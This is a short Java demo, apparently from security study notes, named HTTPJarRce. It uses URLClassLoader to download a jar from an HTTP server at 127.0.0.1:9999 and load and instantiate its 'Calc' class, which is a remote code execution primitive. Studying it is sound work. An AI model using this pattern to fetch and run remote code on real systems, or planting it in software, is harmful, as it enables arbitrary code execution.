package src.DynamicClassLoader.URLClassLoader;

import java.net.URL;
import java.net.URLClassLoader;

// URLClassLoader 的 HTTP + jar
public class HTTPJarRce {
    public static void main(String[] args) throws Exception{
        URLClassLoader urlClassLoader = new URLClassLoader(new URL[]{new URL("jar:http://127.0.0.1:9999/Calc.jar!/")});
        Class calc = urlClassLoader.loadClass("Calc");
        calc.newInstance();
    }
}
